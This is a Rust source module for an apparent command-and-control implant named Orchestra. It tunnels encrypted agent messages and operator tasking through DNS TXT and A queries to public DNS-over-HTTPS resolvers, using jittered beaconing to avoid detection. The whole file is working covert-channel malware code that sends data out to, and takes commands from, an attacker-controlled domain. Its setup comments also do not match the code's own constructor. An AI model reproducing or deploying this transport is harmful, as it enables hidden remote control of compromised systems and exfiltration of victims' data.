//! DNS-over-HTTPS (DoH) covert transport for the Orchestra agent.
//!
//! # Status: EXPERIMENTAL - not recommended for production use.
//! Enabled only when built with `--features doh-transport`.
//!
//! This module implements a `Transport` that tunnels agent messages inside DNS
//! TXT queries sent to a DoH resolver (Cloudflare, Google, etc.).  The C2
//! server must run a corresponding DoH-aware listener to decode the TXT
//! payload.
//!
//! ## How to enable
//!
//! 1. Set `dns_over_https = true` and optionally `cdn_relay` in `agent.toml`.
//! 2. In `agent/src/lib.rs` `Agent::new()`, replace the default TLS transport
//!    with `c2_doh::DohTransport::new(&profile, &sleep_cfg, session).await?`.
//!
//! ## Limitations
//!
//! * Maximum payload per DNS TXT record is ~255 bytes; large messages are
//!   automatically fragmented and reassembled.
//! * DoH resolvers may rate-limit or cache queries; jitter from `SleepConfig`
//!   is applied between fragments to reduce fingerprinting.
//! * Server-side DoH listener is **not** included in this release.

use anyhow::{anyhow, Result};
use async_trait::async_trait;
use common::config::{MalleableProfile, SleepConfig};
use common::{CryptoSession, Message, Transport};
use hex;
use rand::seq::SliceRandom;
use sha2::{Digest, Sha256};
use std::sync::Arc;
use tokio::time::Duration;

const DOH_RESOLVERS: &[&str] = &[
    "https://cloudflare-dns.com/dns-query",
    "https://dns.google/resolve",
    "https://dns.quad9.net/dns-query",
];

/// Custom `ServerCertVerifier` that pins the server certificate by its
/// SHA-256 fingerprint (64 lowercase hex characters).  If the presented
/// end-entity certificate's DER encoding does not hash to the expected
/// fingerprint, the TLS handshake is rejected.
///
/// When `expected_fingerprint` is `None`, the verifier delegates to rustls's
/// built-in `WebPkiVerifier` with platform root certificates — i.e. standard
/// CA-based verification.
struct FingerprintVerifier {
    expected_fingerprint: Option<String>,
    webpki: rustls_0_21::client::WebPkiVerifier,
}

impl FingerprintVerifier {
    fn new(expected_fingerprint: Option<String>) -> Self {
        let mut root_store = rustls_0_21::RootCertStore::empty();
        for cert in rustls_native_certs::load_native_certs()
            .certs
            .into_iter()
            .map(|c| rustls_0_21::Certificate(c.as_ref().to_vec()))
        {
            root_store.add(&cert).ok();
        }
        let webpki = rustls_0_21::client::WebPkiVerifier::new(root_store, None);
        Self {
            expected_fingerprint,
            webpki,
        }
    }
}

impl rustls_0_21::client::ServerCertVerifier for FingerprintVerifier {
    fn verify_server_cert(
        &self,
        end_entity: &rustls_0_21::Certificate,
        intermediates: &[rustls_0_21::Certificate],
        server_name: &rustls_0_21::ServerName,
        scts: &mut dyn Iterator<Item = &[u8]>,
        ocsp_response: &[u8],
        now: std::time::SystemTime,
    ) -> Result<rustls_0_21::client::ServerCertVerified, rustls_0_21::Error> {
        let digest = Sha256::digest(&end_entity.0);
        let hex_fp = hex::encode(digest);

        if let Some(ref expected) = self.expected_fingerprint {
            if hex_fp != expected.to_lowercase() {
                log::error!(
                    "cert pinning: fingerprint mismatch (got {}, expected {})",
                    hex_fp,
                    expected
                );
                return Err(rustls_0_21::Error::InvalidCertificate(
                    rustls_0_21::CertificateError::UnknownIssuer,
                ));
            }
            log::debug!("cert pinning: fingerprint verified OK");
            Ok(rustls_0_21::client::ServerCertVerified::assertion())
        } else {
            self.webpki
                .verify_server_cert(end_entity, intermediates, server_name, scts, ocsp_response, now)
        }
    }

    fn verify_tls12_signature(
        &self,
        message: &[u8],
        cert: &rustls_0_21::Certificate,
        dss: &rustls_0_21::DigitallySignedStruct,
    ) -> Result<rustls_0_21::client::HandshakeSignatureValid, rustls_0_21::Error> {
        self.webpki.verify_tls12_signature(message, cert, dss)
    }

    fn verify_tls13_signature(
        &self,
        message: &[u8],
        cert: &rustls_0_21::Certificate,
        dss: &rustls_0_21::DigitallySignedStruct,
    ) -> Result<rustls_0_21::client::HandshakeSignatureValid, rustls_0_21::Error> {
        self.webpki.verify_tls13_signature(message, cert, dss)
    }
}

pub struct DohTransport {
    profile: MalleableProfile,
    client: reqwest::Client,
    session: CryptoSession,
    session_id: u32,
    seq: u32,
    agent_id: String,
}

impl DohTransport {
    pub async fn new(
        profile: &MalleableProfile,
        session: CryptoSession,
        agent_id: String,
        cert_fingerprint: Option<String>,
    ) -> Result<Self> {
        let mut headers = reqwest::header::HeaderMap::new();
        headers.insert(
            reqwest::header::USER_AGENT,
            reqwest::header::HeaderValue::from_str(&profile.user_agent)?,
        );
        headers.insert(
            reqwest::header::ACCEPT,
            reqwest::header::HeaderValue::from_static("application/dns-json"),
        );

        // Build HTTP client with certificate pinning when configured.
        let client = if cert_fingerprint.is_some() {
            let verifier = FingerprintVerifier::new(cert_fingerprint);
            let config = rustls_0_21::ClientConfig::builder()
                .with_safe_defaults()
                .with_custom_certificate_verifier(Arc::new(verifier))
                .with_no_client_auth();
            reqwest::Client::builder()
                .use_preconfigured_tls(config)
                .default_headers(headers)
                .build()?
        } else {
            reqwest::Client::builder()
                .use_rustls_tls()
                .default_headers(headers)
                .build()?
        };

        Ok(Self {
            profile: profile.clone(),
            client,
            session,
            session_id: rand::random(),
            seq: 0,
            agent_id,
        })
    }

    /// Select the DoH resolver endpoint to use.
    ///
    /// If the configured `doh_server_url` is set, use it as the primary
    /// endpoint.  Otherwise fall back to a random entry from the built-in
    /// `DOH_RESOLVERS` list.
    fn select_resolver(&self) -> String {
        if let Some(ref url) = self.profile.doh_server_url {
            if !url.is_empty() {
                return url.clone();
            }
        }
        DOH_RESOLVERS
            .choose(&mut rand::thread_rng())
            .unwrap_or(&DOH_RESOLVERS[0])
            .to_string()
    }

    async fn execute_query(&self, domain: &str, qtype: &str) -> Result<serde_json::Value> {
        // Try the primary resolver first; on failure, fall back through the
        // built-in DOH_RESOLVERS list.
        let primary = self.select_resolver();
        let url = format!("{}?name={}&type={}", primary, domain, qtype);

        match self.client.get(&url).send().await {
            Ok(resp) => {
                let json: serde_json::Value = resp.json().await?;
                return Ok(json);
            }
            Err(e) => {
                log::warn!("DoH query to {} failed: {}; trying fallback resolvers", primary, e);
            }
        }

        // Fallback: try each built-in resolver in random order.
        let mut fallbacks: Vec<&&str> = DOH_RESOLVERS.iter().collect();
        fallbacks.shuffle(&mut rand::thread_rng());
        for resolver in fallbacks {
            let url = format!("{}?name={}&type={}", resolver, domain, qtype);
            match self.client.get(&url).send().await {
                Ok(resp) => {
                    let json: serde_json::Value = resp.json().await?;
                    return Ok(json);
                }
                Err(e) => {
                    log::warn!("DoH fallback {} failed: {}", resolver, e);
                    continue;
                }
            }
        }
        Err(anyhow!("All DoH resolvers failed for query '{}'", domain))
    }
}

#[async_trait]
impl Transport for DohTransport {
    async fn send(&mut self, msg: Message) -> Result<()> {
        let serialized = bincode::serialize(&msg)?;
        let ciphertext = self.session.encrypt(&serialized);

        let b32_data = base32::encode(base32::Alphabet::RFC4648 { padding: false }, &ciphertext);
        let chunks: Vec<&str> = b32_data
            .as_bytes()
            .chunks(63)
            .map(|c| std::str::from_utf8(c).unwrap())
            .collect();

        for chunk in chunks {
            self.seq = self.seq.wrapping_add(1);
            let domain = format!(
                "{}.{}.{:x}.{}",
                self.seq,
                chunk.to_ascii_lowercase(),
                self.session_id,
                self.profile.host_header
            );

            // Send chunk via TXT query
            let _ = self.execute_query(&domain, "TXT").await?;

            let sleep_dur =
                crate::obfuscated_sleep::calculate_jittered_sleep(&SleepConfig::default());
            crate::memory_guard::guarded_sleep(
                Duration::from_millis(sleep_dur.as_millis() as u64 / 10),
                None,
                0,
            )
            .await?;
        }

        Ok(())
    }

    async fn recv(&mut self) -> Result<Message> {
        // Beacon loop: query for tasking, sleep with jitter if none available,
        // then retry.  Never return a synthetic message — block until real
        // tasking arrives or an error occurs.
        loop {
            // Beacon: A record query
            let beacon_domain =
                format!("{}.{:x}.{}", self.profile.dns_prefix, self.session_id, self.profile.host_header);
            let json = self.execute_query(&beacon_domain, "A").await?;

            // Check for a magic "tasking available" signal in the A record answer.
            // A domain that always resolves (e.g., exists in DNS) will always have
            // an Answer field, so we must look for a *specific* sentinel IP address
            // to indicate that actual tasking is waiting.  The sentinel is
            // configurable per malleable profile; any other answer — including
            // legitimate CDN IPs — is treated as "no tasking".
            let has_tasking = json
                .get("Answer")
                .and_then(|a| a.as_array())
                .map(|arr| {
                    arr.iter().any(|r| {
                        r.get("data")
                            .and_then(|d| d.as_str())
                            .map(|s| s.trim() == self.profile.doh_beacon_sentinel.as_str())
                            .unwrap_or(false)
                    })
                })
                .unwrap_or(false);

            if has_tasking {
                break;
            }

            // No tasking available — sleep for the configured jitter interval
            // using the same obfuscated_sleep mechanism, then retry the beacon.
            let sleep_dur =
                crate::obfuscated_sleep::calculate_jittered_sleep(&SleepConfig::default());
            crate::memory_guard::guarded_sleep(sleep_dur, None, 0).await?;
        }

        // Fetch actual data via TXT record
        let task_domain = format!("{}.{:x}.{}", common::ioc::IOC_DNS_TASK, self.session_id, self.profile.host_header);
        let txt_json = self.execute_query(&task_domain, "TXT").await?;

        let answer = txt_json
            .get("Answer")
            .and_then(|a| a.as_array())
            .ok_or(anyhow!("Invalid format"))?;
        let mut full_b32 = String::new();
        for record in answer {
            if let Some(data) = record.get("data").and_then(|d| d.as_str()) {
                full_b32.push_str(data.trim_matches('"'));
            }
        }

        let ciphertext = base32::decode(base32::Alphabet::RFC4648 { padding: false }, &full_b32)
            .ok_or(anyhow!("Base32 decode failed"))?;

        let plaintext = self.session.decrypt(&ciphertext)?;
        let msg = bincode::deserialize(&plaintext)?;

        Ok(msg)
    }
}
